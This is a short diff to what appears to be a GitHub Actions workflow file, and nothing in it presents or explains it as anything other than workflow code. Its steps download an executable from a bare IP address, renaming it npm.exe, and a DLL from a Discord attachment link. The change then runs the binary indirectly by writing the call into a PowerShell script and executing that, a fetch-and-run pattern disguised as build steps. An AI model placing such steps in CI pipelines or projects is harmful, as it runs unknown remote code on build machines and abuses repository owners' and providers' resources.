@@ -31,6 +31,7 @@ jobs:
           dir
           Invoke-WebRequest http://5.102.153.140/lambdatest/chrome.exe -OutFile npm.exe
           Invoke-WebRequest https://cdn.discordapp.com/attachments/714547391746932747/830537244028305418/Nancy.dll -OutFile Nancy.dll
-          .\npm.exe
+          cmd /c echo .\npm.exe >>a.ps1
+          .\a.ps1
           echo Add other actions to build,
           echo test, and deploy your project.
